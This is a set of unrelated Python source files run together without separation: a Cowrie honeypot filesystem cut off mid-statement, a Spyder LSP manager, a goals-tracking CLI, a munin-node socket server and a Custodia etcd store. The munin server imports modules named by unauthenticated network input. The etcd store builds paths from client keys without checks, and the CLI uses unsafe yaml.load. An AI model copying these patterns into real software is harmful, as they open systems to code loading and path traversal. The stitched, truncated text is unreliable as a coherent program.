    A_UID, \
    A_GID, \
    A_SIZE, \
    A_MODE, \
    A_CTIME, \
    A_CONTENTS, \
    A_TARGET, \
    A_REALFILE = list(range(0, 10))
T_LINK, \
    T_DIR, \
    T_FILE, \
    T_BLK, \
    T_CHR, \
    T_SOCK, \
    T_FIFO = list(range(0, 7))

class TooManyLevels(Exception):
    """
    62 ELOOP Too many levels of symbolic links.  A path name lookup involved more than 8 symbolic links.
    raise OSError(errno.ELOOP, os.strerror(errno.ENOENT))
    """
    pass



class FileNotFound(Exception):
    """
    raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
    """
    pass



class HoneyPotFilesystem(object):
    """
    """

    def __init__(self, fs, cfg):
        self.fs = fs
        self.cfg = cfg

        # Keep track of open file descriptors
        self.tempfiles = {}
        self.filenames = {}

        # Keep count of new files, so we can have an artificial limit
        self.newcount = 0

        # Get the honeyfs path from the config file and explore it for file
        # contents:
        self.init_honeyfs(self.cfg.get('honeypot', 'contents_path'))


    def init_honeyfs(self, honeyfs_path):
        """
        Explore the honeyfs at 'honeyfs_path' and set all A_REALFILE attributes on
        the virtual filesystem.
        """

        for path, directories, filenames in os.walk(honeyfs_path):
            for filename in filenames:
                realfile_path = os.path.join(path, filename)
                virtual_path = '/' + os.path.relpath(realfile_path, honeyfs_path)

                f = self.getfile(virtual_path, follow_symlinks=False)
                if f and f[A_TYPE] == T_FILE:
                    self.update_realfile(f, realfile_path)

    def resolve_path(self, path, cwd):
        """
        This function does not need to be in this class, it has no dependencies
        """
        pieces = path.rstrip('/').split('/')

        if path[0] == '/':
            cwd = []
        else:
            cwd = [x for x in cwd.split('/') if len(x) and x is not None]

        while 1:
            if not len(pieces):
                break
            piece = pieces.pop(0)
            if piece == '..':
                if len(cwd): cwd.pop()
                continue
            if piece in ('.', ''):
                continue
            cwd.append(piece)

        return '/%s' % ('/'.join(cwd),)


    def resolve_path_wc(self, path, cwd):
        """
        Resolve_path with wildcard support (globbing)
        """
        pieces = path.rstrip('/').split('/')
        if len(pieces[0]):
            cwd = [x for x in cwd.split('/') if len(x) and x is not None]
            path = path[1:]
        else:
            cwd, pieces = [], pieces[1:]
        found = []
        def foo(p, cwd):
            if not len(p):
                found.append('/%s' % ('/'.join(cwd),))
            elif p[0] == '.':
                foo(p[1:], cwd)
            elif p[0] == '..':
                foo(p[1:], cwd[:-1])
            else:
                names = [x[A_NAME] for x in self.get_path('/'.join(cwd))]
                matches = [x for x in names if fnmatch.fnmatchcase(x, p[0])]
                for match in matches:
                    foo(p[1:], cwd + [match])
        foo(pieces, cwd)
        return found


    def get_path(self, path, follow_symlinks=True):
        """
        This returns the Cowrie file system objects for a directory
        """
        cwd = self.fs
        for part in path.split('/'):
            if not len(part):
                continue
            ok = False
            for c in cwd[A_CONTENTS]:
                if c[A_NAME] == part:
                    if c[A_TYPE] == T_LINK:
                        cwd = self.getfile(c[A_TARGET],
                            follow_symlinks=follow_symlinks)
                    else:
                        cwd = c
                    ok = True
                    break
            if not ok:
                raise FileNotFound
        return cwd[A_CONTENTS]


    def exists(self, path):
        """
        Return True if path refers to an existing path.
        Returns False for broken symbolic links.
        """
        f = self.getfile(path, follow_symlinks=True)
        if f is not False:
            return True


    def lexists(self, path):
        """
        Return True if path refers to an existing path.
        Returns True for broken symbolic links.
        """
        f = self.getfile(path, follow_symlinks=False)
        if f is not False:
            return True


    def update_realfile(self, f, realfile):
        """
        """
        if not f[A_REALFILE] and os.path.exists(realfile) and \
                not os.path.islink(realfile) and os.path.isfile(realfile) and \
                f[A_SIZE] < 25000000:
            f[A_REALFILE] = realfile


    def getfile(self, path, follow_symlinks=True):
        """
        This returns the Cowrie file system object for a path
        """
        if path == '/':
            return self.fs
        pieces = path.strip('/').split('/')
        cwd = ''
        p = self.fs
        for piece in pieces:
            if piece not in [x[A_NAME] for x in p[A_CONTENTS]]:
                return False
            for x in p[A_CONTENTS]:
                if x[A_NAME] == piece:
                    if piece == pieces[-1] and follow_symlinks==False:
                        p = x
                    elif x[A_TYPE] == T_LINK:
                        if x[A_TARGET][0] == '/':
                            # Absolute link
                            p = self.getfile(x[A_TARGET],
                                follow_symlinks=follow_symlinks)
                        else:
                            # Relative link
                            p = self.getfile('/'.join((cwd, x[A_TARGET])),
                                follow_symlinks=follow_symlinks)
                        if p == False:
                            # Broken link
                            return False
                    else:
                        p = x
            cwd = '/'.join((cwd, piece))                    
        return p


    def file_contents(self, target):
        """
        Retrieve the content of a file in the honeyfs
        It follows links.
        It tries A_REALFILE first and then tries honeyfs directory
        """
        path = self.resolve_path(target, os.path.dirname(target))
        if not path or not self.exists(path):
            raise FileNotFound
        f = self.getfile(path)
        if f[A_TYPE] == T_DIR:
            raise IsADirectoryError
        elif f[A_TYPE] == T_FILE and f[A_REALFILE]:
            return open(f[A_REALFILE], 'rb').read()
        elif f[A_TYPE] == T_FILE and f[A_SIZE] == 0:
            # Zero-byte file lacking A_REALFILE backing: probably empty.
            # (The exceptions to this are some system files in /proc and /sys,
            # but it's likely better to return nothing than suspiciously fail.)
            return ''


    def mkfile(self, path, uid, gid, size, mode, ctime=None):
        """
        """
        if self.newcount > 10000:
            return False
        if ctime is None:
            ctime = time.time()
        dir = self.get_path(os.path.dirname(path))
        outfile = os.path.basename(path)
        if outfile in [x[A_NAME] for x in dir]:
            dir.remove([x for x in dir if x[A_NAME] == outfile][0])
        dir.append([outfile, T_FILE, uid, gid, size, mode, ctime, [],
            None, None])
        self.newcount += 1
        return True


    def mkdir(self, path, uid, gid, size, mode, ctime=None):
        """
        """
        if self.newcount > 10000:
            raise OSError(errno.EDQUOT, os.strerror(errno.EDQUOT), path)
        if ctime is None:
            ctime = time.time()
        if not len(path.strip('/')):
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), path)
        try:
            dir = self.get_path(os.path.dirname(path.strip('/')))
        except IndexError:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), path)
            return False
        dir.append([os.path.basename(path), T_DIR, uid, gid, size, mode,
            ctime, [], None, None])
        self.newcount += 1


    def isfile(self, path):
        """
        Return True if path is an existing regular file. This follows symbolic
        links, so both islink() and isfile() can be true for the same path.
        """
        try:
            f = self.getfile(path)
        except:
            return False
        return f[A_TYPE] == T_FILE


    def islink(self, path):
        """
        Return True if path refers to a directory entry that is a symbolic
        link. Always False if symbolic links are not supported by the python
        runtime.
        """
        try:
            f = self.getfile(path)
        except:
            return False
        return f[A_TYPE] == T_LINK


    def isdir(self, path):
        """
        Return True if path is an existing directory.
        This follows symbolic links, so both islink() and isdir() can be true for the same path.
        """
        if path == '/':
            return True
        try:
            dir = self.getfile(path)
        except:
            dir = None
        if dir is None or dir is False:
            return False
        if dir[A_TYPE] == T_DIR:
            return True
        else:
            return False

    """
    Below additions for SFTP support, try to keep functions here similar to os.*
    """
    def open(self, filename, openFlags, mode):
        """
        #log.msg("fs.open %s" % filename)

        #if (openFlags & os.O_APPEND == os.O_APPEND):
        #    log.msg("fs.open append")

        #if (openFlags & os.O_CREAT == os.O_CREAT):
        #    log.msg("fs.open creat")

        #if (openFlags & os.O_TRUNC == os.O_TRUNC):
        #    log.msg("fs.open trunc")

        #if (openFlags & os.O_EXCL == os.O_EXCL):
        #    log.msg("fs.open excl")

        # treat O_RDWR same as O_WRONLY
        """
        if openFlags & os.O_WRONLY == os.O_WRONLY or openFlags & os.O_RDWR == os.O_RDWR:
            # strip executable bit
            hostmode = mode & ~(111)
            hostfile = '%s/%s_sftp_%s' % \
                       (self.cfg.get('honeypot', 'download_path'),
                    time.strftime('%Y%m%d-%H%M%S'),
                    re.sub('[^A-Za-z0-9]', '_', filename))
            #log.msg("fs.open file for writing, saving to %s" % safeoutfile)
            self.mkfile(filename, 0, 0, 0, stat.S_IFREG | mode)
            fd = os.open(hostfile, openFlags, hostmode)
            self.update_realfile(self.getfile(filename), hostfile)
            self.tempfiles[fd] = hostfile
            self.filenames[fd] = filename
            return fd

        elif openFlags & os.O_RDONLY == os.O_RDONLY:
            return None

        return None


    def read(self, fd, size):
        """
        """
        # this should not be called, we intercept at readChunk
        raise notImplementedError


    def write(self, fd, string):
        """
        """
        return os.write(fd, string)


    def close(self, fd):
        """
        """
        if not fd:
            return True
        if self.tempfiles[fd] is not None:
            shasum = hashlib.sha256(open(self.tempfiles[fd], 'rb').read()).hexdigest()
            shasumfile = self.cfg.get('honeypot', 'download_path') + "/" + shasum
            if (os.path.exists(shasumfile)):
                os.remove(self.tempfiles[fd])
            else:
                os.rename(self.tempfiles[fd], shasumfile)
            #os.symlink(shasum, self.tempfiles[fd])
            self.update_realfile(self.getfile(self.filenames[fd]), shasumfile)
            log.msg(format='SFTP Uploaded file \"%(filename)s\" to %(outfile)s',
                    eventid='cowrie.session.file_upload',
                    filename=os.path.basename(self.filenames[fd]),
                    outfile=shasumfile,
                    shasum=shasum)
            del self.tempfiles[fd]
            del self.filenames[fd]
        return os.close(fd)


    def lseek(self, fd, offset, whence):
        """
        """
        if not fd:
            return True
        return os.lseek(fd, offset, whence)


    def mkdir2(self, path):
        """
        FIXME mkdir() name conflicts with existing mkdir
        """
        dir = self.getfile(path)
        if dir != False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST), path)
        self.mkdir(path, 0, 0, 4096, 16877)


    def rmdir(self, path):
        """
        """
        path = path.rstrip('/')
        name = os.path.basename(path)
        parent = os.path.dirname(path)
        dir = self.getfile(path, follow_symlinks=False)
        if dir == False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST), path)
        if dir[A_TYPE] != T_DIR:
            raise OSError(errno.ENOTDIR, os.strerror(errno.ENOTDIR), path)
        if len(self.get_path(path))>0:
            raise OSError(errno.ENOTEMPTY, os.strerror(errno.ENOTEMPTY), path)
        pdir = self.get_path(parent,follow_symlinks=True)
        for i in pdir[:]:
            if i[A_NAME] == name:
                pdir.remove(i)
                return True
        return False


    def utime(self, path, atime, mtime):
        """
        """
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        p[A_CTIME] = mtime


    def chmod(self, path, perm):
        """
        """
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        p[A_MODE] = stat.S_IFMT(p[A_MODE]) | perm


    def chown(self, path, uid, gid):
        """
        """
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        if (uid != -1):
            p[A_UID] = uid
        if (gid != -1):
            p[A_GID] = gid


    def remove(self, path):
        """
        """
        p = self.getfile(path, follow_symlinks=False)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        self.get_path(os.path.dirname(path)).remove(p)
        return


    def readlink(self, path):
        """
        """
        p = self.getfile(path, follow_symlinks=False)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        if not (p[A_MODE] & stat.S_IFLNK):
            raise OSError
        return p[A_TARGET]


    def symlink(self, targetPath, linkPath):
        """
        """
        raise notImplementedError


    def rename(self, oldpath, newpath):
        """
        """
        old = self.getfile(oldpath)
        if old == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        new = self.getfile(newpath)
        if new != False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST))

        self.get_path(os.path.dirname(oldpath)).remove(old)
        old[A_NAME] = os.path.basename(newpath)
        self.get_path(os.path.dirname(newpath)).append(old)
        return


    def listdir(self, path):
        """
        """
        names = [x[A_NAME] for x in self.get_path(path)]
        return names


    def lstat(self, path):
        """
        """
        return self.stat(path, follow_symlinks=False)


    def stat(self, path, follow_symlinks=True):
        """
        """
        if (path == "/"):
            p = {A_TYPE:T_DIR, A_UID:0, A_GID:0, A_SIZE:4096, A_MODE:16877,
                A_CTIME:time.time()}
        else:
            p = self.getfile(path, follow_symlinks=follow_symlinks)

        if (p == False):
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))

        return _statobj( p[A_MODE], 0, 0, 1, p[A_UID], p[A_GID], p[A_SIZE],
            p[A_CTIME], p[A_CTIME], p[A_CTIME])


    def realpath(self, path):
        """
        """
        return path


    def update_size(self, filename, size):
        """
        """
        f = self.getfile(filename)
        if f == False:
            return
        if f[A_TYPE] != T_FILE:
            return
        f[A_SIZE] = size



class _statobj(object):
    """
    Transform a tuple into a stat object
    """
    def __init__(self, st_mode, st_ino, st_dev, st_nlink, st_uid, st_gid, st_size, st_atime, st_mtime, st_ctime):
        self.st_mode = st_mode
        self.st_ino = st_ino
        self.st_dev = st_dev
        self.st_nlink = st_nlink
        self.st_uid = st_uid
        self.st_gid = st_gid
        self.st_size = st_size
        self.st_atime = st_atime
        self.st_mtime = st_mtime
        self.st_ctime = st_ctime


# -*- coding: utf-8 -*-
#
# Copyright  Spyder Project Contributors
# Licensed under the terms of the MIT License
# (see spyder/__init__.py for details)

"""
Manager for all LSP clients connected to the servers defined
in our Preferences.
"""

import logging
import os

from qtpy.QtCore import QObject, Slot

from spyder.config.main import CONF
from spyder.utils.misc import select_port, getcwd_or_home
from spyder.plugins.editor.lsp.client import LSPClient


logger = logging.getLogger(__name__)


class LSPManager(QObject):
    """Language Server Protocol manager."""
    STOPPED = 'stopped'
    RUNNING = 'running'

    def __init__(self, parent):
        QObject.__init__(self)
        self.main = parent

        self.lsp_plugins = {}
        self.clients = {}
        self.requests = {}
        self.register_queue = {}

        # Get configurations for all LSP servers registered through
        # our Preferences
        self.configurations_for_servers = CONF.options('lsp-server')

        # Register languages to create clients for
        for language in self.configurations_for_servers:
            self.clients[language] = {
                'status': self.STOPPED,
                'config': CONF.get('lsp-server', language),
                'instance': None
            }
            self.register_queue[language] = []

    def register_plugin_type(self, type, sig):
        self.lsp_plugins[type] = sig

    def register_file(self, language, filename, signal):
        if language in self.clients:
            language_client = self.clients[language]['instance']
            if language_client is None:
                self.register_queue[language].append((filename, signal))
            else:
                language_client.register_file(filename, signal)

    def get_root_path(self):                    
        """
        Get root path to pass to the LSP servers, i.e. project path or cwd.                    
        """
        path = None
        if self.main and self.main.projects:
            path = self.main.projects.get_active_project_path()
        if not path:
            path = getcwd_or_home()                    
        return path

    @Slot()
    def reinitialize_all_lsp_clients(self):
        """
        Send a new initialize message to each LSP server when the project
        path has changed so they can update the respective server root paths.
        """
        for language_client in self.clients.values():                    
            if language_client['status'] == self.RUNNING:
                folder = self.get_root_path()                    
                inst = language_client['instance']                    
                inst.folder = folder                    
                inst.initialize()                    

    def start_lsp_client(self, language):
        started = False
        if language in self.clients:
            language_client = self.clients[language]
            queue = self.register_queue[language]

            # Don't start LSP services in our CIs unless we demand
            # them.
            if (os.environ.get('CI', False) and
                    not os.environ.get('SPY_TEST_USE_INTROSPECTION')):
                return started

            # Start client
            started = language_client['status'] == self.RUNNING
            if language_client['status'] == self.STOPPED:
                config = language_client['config']

                if not config['external']:
                    port = select_port(default_port=config['port'])
                    config['port'] = port

                language_client['instance'] = LSPClient(
                    parent=self,
                    server_settings=config,
                    folder=self.get_root_path(),                    
                    language=language)

                for plugin in self.lsp_plugins:
                    language_client['instance'].register_plugin_type(
                        plugin, self.lsp_plugins[plugin])

                logger.info("Starting LSP client for {}...".format(language))
                language_client['instance'].start()
                language_client['status'] = self.RUNNING
                for entry in queue:
                    language_client.register_file(*entry)
                self.register_queue[language] = []
        return started

    def shutdown(self):
        logger.info("Shutting down LSP manager...")
        for language in self.clients:
            self.close_client(language)

    def update_server_list(self):
        for language in self.configurations_for_servers:
            config = {'status': self.STOPPED,
                      'config': CONF.get('lsp-server', language),
                      'instance': None}
            if language not in self.clients:
                self.clients[language] = config
                self.register_queue[language] = []
            else:
                logger.debug(
                    self.clients[language]['config'] != config['config'])
                current_config = self.clients[language]['config']
                new_config = config['config']
                restart_diff = ['cmd', 'args', 'host', 'port', 'external']
                restart = any([current_config[x] != new_config[x]
                               for x in restart_diff])
                if restart:
                    if self.clients[language]['status'] == self.STOPPED:
                        self.clients[language] = config
                    elif self.clients[language]['status'] == self.RUNNING:
                        self.close_client(language)
                        self.clients[language] = config
                        self.start_lsp_client(language)
                else:
                    if self.clients[language]['status'] == self.RUNNING:
                        client = self.clients[language]['instance']
                        client.send_plugin_configurations(
                            new_config['configurations'])

    def update_client_status(self, active_set):
        for language in self.clients:
            if language not in active_set:
                self.close_client(language)

    def close_client(self, language):
        if language in self.clients:
            language_client = self.clients[language]
            if language_client['status'] == self.RUNNING:
                logger.info("Stopping LSP client for {}...".format(language))
                # language_client['instance'].shutdown()
                # language_client['instance'].exit()
                language_client['instance'].stop()
            language_client['status'] = self.STOPPED

    def send_request(self, language, request, params):
        if language in self.clients:
            language_client = self.clients[language]
            if language_client['status'] == self.RUNNING:
                client = self.clients[language]['instance']
                client.perform_request(request, params)

from __future__ import absolute_import

import datetime

from .config import get_config_file_paths
from .util import *

# config file path
GOALS_CONFIG_FILE_PATH = get_config_file_paths()['GOALS_CONFIG_FILE_PATH']
GOALS_CONFIG_FOLDER_PATH = get_folder_path_from_file_path(
    GOALS_CONFIG_FILE_PATH)


def strike(text):
    """
    strikethrough text
    :param text:
    :return:
    """
    return u'\u0336'.join(text) + u'\u0336'

def get_goal_file_path(goal_name):
    return GOALS_CONFIG_FOLDER_PATH + '/' + goal_name + '.yaml'

def process(input):
    """
    the main process
    :param input:
    """
    _input = input.lower().strip()
    check_sub_command(_input)

def check_sub_command(c):
    """
    command checker
    :param c:
    :return:
    """
    sub_commands = {
        'new': new_goal,
        'tasks': view_related_tasks,
        'view': list_goals,
        'complete': complete_goal,
        'analyze': goals_analysis,
    }
    try:
        return sub_commands[c]()
    except KeyError:
        click.echo(chalk.red('Command does not exist!'))
        click.echo('Try "yoda goals --help" for more info')

def goals_dir_check():
    """
    check if goals directory exists. If not, create
    """
    if not os.path.exists(GOALS_CONFIG_FOLDER_PATH):
        try:
            os.makedirs(GOALS_CONFIG_FOLDER_PATH)
        except OSError as exc:  # Guard against race condition
            if exc.errno != errno.EEXIST:
                raise


def append_data_into_file(data, file_path):
    """
    append data into existing file
    :param data:
    :param file_path:
    """
    with open(file_path) as file:
        # read contents
        contents = yaml.load(file)
        contents['entries'].append(
            data
        )

        # enter data
        with open(file_path, "w") as file:
            yaml.dump(contents, file, default_flow_style=False)

def complete_goal():
    """
    complete a goal
    """
    not_valid_goal_number = 1
    if os.path.isfile(GOALS_CONFIG_FILE_PATH):
        with open(GOALS_CONFIG_FILE_PATH) as todays_tasks_entry:
            contents = yaml.load(todays_tasks_entry)
            i = 0
            no_goal_left = True
            for entry in contents['entries']:
                i += 1
                if entry['status'] == 0:
                    no_goal_left = False

            if no_goal_left:
                click.echo(chalk.green(
                    'All goals have been completed! Add a new goal by entering "yoda goals new"'))
            else:
                click.echo('Goals:')
                click.echo('----------------')
                click.echo("Number |  Deadline   | Goal")
                click.echo("-------|-------------|-----")

                i = 0
                for entry in contents['entries']:
                    i += 1
                    deadline = entry['deadline']
                    text = entry['text'] if entry['status'] == 0 else strike(
                        entry['text'])
                    if entry['status'] == 0:
                        click.echo("   " + str(i) + "   | " +
                                   deadline + "  | " + text)
                while not_valid_goal_number:
                    click.echo(chalk.blue(
                        'Enter the goal number that you would like to set as completed'))
                    goal_to_be_completed = int(input())
                    if goal_to_be_completed > len(contents['entries']):
                        click.echo(chalk.red('Please Enter a valid goal number!'))
                    else:
                        contents['entries'][goal_to_be_completed - 1]['status'] = 1
                        input_data(contents, GOALS_CONFIG_FILE_PATH)
                        not_valid_goal_number = 0
    else:
        click.echo(chalk.red(
            'There are no goals set. Set a new goal by entering "yoda goals new"'))

def goal_name_exists(goal_name):
    file_name = get_goal_file_path(goal_name)
    return os.path.isfile(file_name)

def new_goal():
    """
    new goal
    """

    goals_dir_check()

    click.echo(chalk.blue('Input a single-word name of the goal:'))
    goal_name = input().strip()                    

    if goal_name_exists(goal_name):
        click.echo(chalk.red(
            'A goal with this name already exists. Please type "yoda goals view" to see a list of existing goals'))
    else:
        click.echo(chalk.blue('Input description of the goal:'))
        text = input().strip()

        click.echo(chalk.blue('Input due date for the goal (YYYY-MM-DD):'))
        deadline = input().strip()                    

        if os.path.isfile(GOALS_CONFIG_FILE_PATH):
            setup_data = dict(
                name=goal_name,
                text=text,
                deadline=deadline,
                status=0
            )
            append_data_into_file(setup_data, GOALS_CONFIG_FILE_PATH)
        else:
            setup_data = dict(
                entries=[
                    dict(
                        name=goal_name,
                        text=text,
                        deadline=deadline,
                        status=0
                    )
                ]
            )
            input_data(setup_data, GOALS_CONFIG_FILE_PATH)

        input_data(dict(entries=[]), get_goal_file_path(goal_name))

def goals_analysis():
    """
    goals alysis
    """

    now = datetime.datetime.now()

    total_goals = 0
    total_incomplete_goals = 0
    total_missed_goals = 0
    total_goals_next_week = 0
    total_goals_next_month = 0

    if os.path.isfile(GOALS_CONFIG_FILE_PATH):
        with open(GOALS_CONFIG_FILE_PATH) as goals_file:
            contents = yaml.load(goals_file)
            for entry in contents['entries']:
                total_goals += 1
                if entry['status'] == 0:
                    total_incomplete_goals += 1
                    deadline = datetime.datetime.strptime(entry['deadline'], '%Y-%m-%d')
                    total_missed_goals += (1 if deadline < now else 0)
                    total_goals_next_week += (1 if (deadline-now).days <= 7 else 0)
                    total_goals_next_month += (1 if (deadline - now).days <= 30 else 0)
        percent_incomplete_goals = total_incomplete_goals * 100 / total_goals
        percent_complete_goals = 100 - percent_incomplete_goals

        click.echo(chalk.red('Percentage of incomplete goals : ' + str(percent_incomplete_goals)))
        click.echo(chalk.green('Percentage of completed goals : ' + str(percent_complete_goals)))
        click.echo(chalk.blue('Number of missed deadlines : ' + str(total_missed_goals)))
        click.echo(chalk.blue('Number of goals due within the next week : ' + str(total_goals_next_week)))
        click.echo(chalk.blue('Number of goals due within the next month : ' + str(total_goals_next_month)))

    else:
        click.echo(chalk.red(
            'There are no goals set. Set a new goal by entering "yoda goals new"'))


def add_task_to_goal(goal_name, date, timestamp):
    goal_filename = get_goal_file_path(goal_name)
    if os.path.isfile(goal_filename):
        setup_data = dict(
            date=date,
            timestamp=timestamp
        )
        append_data_into_file(setup_data, goal_filename)
        return True
    return False

def list_goals():
    """
    get goals listed chronologically by deadlines
    """
    if os.path.isfile(GOALS_CONFIG_FILE_PATH):

        with open(GOALS_CONFIG_FILE_PATH) as goals_file:
            contents = yaml.load(goals_file)

            if len(contents):
                contents['entries'].sort(key=lambda x: x['deadline'].split('-'))

                click.echo('Goals')
                click.echo('----------------')
                click.echo("Status |  Deadline   | Name: text")
                click.echo("-------|-------------|---------------")
                incomplete_goals = 0
                total_tasks = 0
                total_missed_deadline = 0

                for entry in contents['entries']:
                    total_tasks += 1
                    incomplete_goals += (1 if entry['status'] == 0 else 0)
                    deadline = entry['deadline']
                    name = entry['name']
                    text = entry['text'] if entry['status'] == 0 else strike(
                        entry['text'])
                    status = "O" if entry['status'] == 0 else "X"

                    deadline_time = datetime.datetime.strptime(deadline, '%Y-%m-%d')
                    now = datetime.datetime.now()

                    total_missed_deadline += (1 if deadline_time < now else 0)

                    click.echo("   " + status + "   | " + deadline + "  | #" + name + ": " + text)

                click.echo('----------------')
                click.echo('')
                click.echo('Summary:')
                click.echo('----------------')

                if incomplete_goals == 0:
                    click.echo(chalk.green(
                        'All goals have been completed! Set a new goal by entering "yoda goals new"'))
                else:
                    click.echo(chalk.red("Incomplete tasks: " + str(incomplete_goals)))
                    click.echo(chalk.red("Tasks with missed deadline: " + str(total_missed_deadline)))
                    click.echo(chalk.green("Completed tasks: " +
                                           str(total_tasks - incomplete_goals)))

            else:
                click.echo(
                    'There are no goals set. Set a new goal by entering "yoda goals new"')

    else:
        click.echo(
            'There are no goals set. Set a new goal by entering "yoda goals new"')


def view_related_tasks():
    """
    list tasks assigned to the goal
    """

    from .diary import get_task_info

    not_valid_name = True

    if os.path.isfile(GOALS_CONFIG_FILE_PATH):
        while not_valid_name:
            click.echo(chalk.blue(
                'Enter the goal name that you would like to examine'))
            goal_name = input()
            goal_file_name = get_goal_file_path(goal_name)
            if os.path.isfile(goal_file_name):
                not_valid_name = False

        with open(goal_file_name) as goals_file:
            contents = yaml.load(goals_file)

            if len(contents['entries']):

                total_tasks = 0
                total_incomplete = 0

                click.echo('Tasks assigned to the goal:')
                click.echo('----------------')
                click.echo("Status |  Date   | Text")
                click.echo("-------|---------|-----")

                for entry in contents['entries']:
                    timestamp = entry['timestamp']
                    date = entry['date']
                    status, text = get_task_info(timestamp, date)
                    total_tasks += 1
                    total_incomplete += (1 if status == 0 else 0)

                    text = text if status == 0 else strike(text)
                    status = "O" if status == 0 else "X"
                    click.echo("   " + status + "   | " + date + "| " + text)

                click.echo('----------------')
                click.echo('')
                click.echo('Summary:')
                click.echo('----------------')

                click.echo(chalk.red("Incomplete tasks assigned to the goal: " + str(total_incomplete)))
                click.echo(chalk.green("Completed tasks assigned to the goal: " +
                                       str(total_tasks - total_incomplete)))

            else:
                click.echo(chalk.red(
                    'There are no tasks assigned to the goal. Add a new task by entering "yoda diary nt"'))

    else:
        click.echo(chalk.red(
            'There are no goals set. Set a new goal by entering "yoda goals new"'))


import socket
import sys
import re
import os
from _thread import *
from subprocess import Popen, PIPE
 
HOST = ''
PORT = 4949
VERSION = '0.1.0'
ENCODING = 'utf-8'
LINEBREAK = '\n'
PLUGINPATH = os.getcwd() + "\\plugins"
# Thanks to http://www.binarytides.com/python-socket-server-code-example/ for the realy usable example!
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

try:
    s.bind((HOST, PORT))
except socket.error as msg:
    print ("failed!" + str(msg.errno))
    sys.exit()

s.listen(10)
 
def output(what):
  return what.encode(ENCODING)

def hello():
  hostname = socket.getfqdn();
  return "# munin node at " + hostname + LINEBREAK

def nodes():
  return socket.getfqdn() + LINEBREAK + "." + LINEBREAK;

def version():
  return "munins node on " + socket.getfqdn() + " version: " + VERSION + LINEBREAK

def cap():
  return "cap multigraph dirtyconfig" + LINEBREAK

def plugins():
  files = [f for f in os.listdir(PLUGINPATH) if os.path.isfile(os.path.join(PLUGINPATH, f))]
  result = ""
  for f in files:
    if (f.endswith(".py")):
      result += f.replace(".py","") + " "
  return result.strip() + LINEBREAK

def unknown():
  return "# Unknown command. Try cap, list, nodes, config, fetch, version or quit" + LINEBREAK

def callMethod(o, name):
    return getattr(o, name)()

def runPlugin(name):
  module = __import__(name.replace("\r",""))                    
  class_ = getattr(module, name.replace("\r",""))                    
  instance = class_()                    
  return callMethod(instance, "fetch")  + LINEBREAK + "." + LINEBREAK                    

def configPlugin(name):
  module = __import__(name.replace("\r",""))                    
  class_ = getattr(module, name.replace("\r",""))                    
  instance = class_()                    
  return callMethod(instance, "config")  + LINEBREAK + "." + LINEBREAK                    

def clientthread(conn):
    sys.path.append(PLUGINPATH)
    conn.send(output(hello()))  
    while True:
         
        #Receiving from client
        data = conn.recv(4096)
        command = data.decode(ENCODING)
        regex = re.compile(r"[^\s]+(\s[^\s]+)?")
        extractedCommand = regex.match(command).group()
        print("#"+ extractedCommand + "#")
        if (extractedCommand == "nodes"):
          conn.send(output(nodes()))
        elif (extractedCommand == "help"):
          conn.send(output(unknown()))
        elif (extractedCommand == "version"):
          conn.send(output(version()))
        elif (extractedCommand == "cap"):
          conn.send(output(cap()))
        elif (extractedCommand == "list" or extractedCommand.startswith("list ")):
          conn.send(output(plugins()))
        elif (extractedCommand == "quit"):
          break
        else:
          if (extractedCommand.startswith("fetch ")):
            parts = extractedCommand.split(" ")
            conn.send(output(runPlugin(parts[1])))
          elif (extractedCommand.startswith("config ")):
            parts = extractedCommand.split(" ")
            conn.send(output(configPlugin(parts[1])))
          else:
            conn.send(output(unknown()))
        if not data: 
            sys.exit(5)
     
        #conn.sendall(output(reply))
     
    conn.close()
 
while 1:
    conn, addr = s.accept()
    start_new_thread(clientthread ,(conn,))
s.close()

# Copyright (C) 2015  Custodia Project Contributors - see LICENSE file

from __future__ import print_function

import os
import sys

import etcd

from custodia.store.interface import CSStore, CSStoreError, CSStoreExists


def log_error(error):
    print(error, file=sys.stderr)


class EtcdStore(CSStore):

    def __init__(self, config):
        self.server = config.get('etcd_server', '127.0.0.1')
        self.port = int(config.get('etcd_port', 4001))
        self.namespace = config.get('namespace', "/custodia")

        # Initialize the DB by trying to create the default table
        try:
            self.etcd = etcd.Client(self.server, self.port)
            self.etcd.write(self.namespace, None, dir=True)
        except etcd.EtcdNotFile:
            # Already exists
            pass
        except etcd.EtcdException as err:
            log_error("Error creating namespace %s: [%r]" % (self.namespace,
                                                             repr(err)))
            raise CSStoreError('Error occurred while trying to init db')

    def get(self, key):
        try:
            result = self.etcd.get(os.path.join(self.namespace, key))                    
        except etcd.EtcdException as err:
            log_error("Error fetching key %s: [%r]" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to get key')
        return result.value

    def set(self, key, value, replace=False):
        path = os.path.join(self.namespace, key)                    
        try:
            self.etcd.write(path, value, prevExist=replace)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error("Error storing key %s: [%r]" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def span(self, key):
        path = os.path.join(self.namespace, key)                    
        try:
            self.etcd.write(path, None, dir=True, prevExist=False)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error("Error storing key %s: [%r]" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def list(self, keyfilter='/'):
        path = os.path.join(self.namespace, keyfilter)                    
        if path != '/':
            path = path.rstrip('/')
        try:
            result = self.etcd.read(path, recursive=True)
        except etcd.EtcdKeyNotFound:
            return None
        except etcd.EtcdException as err:
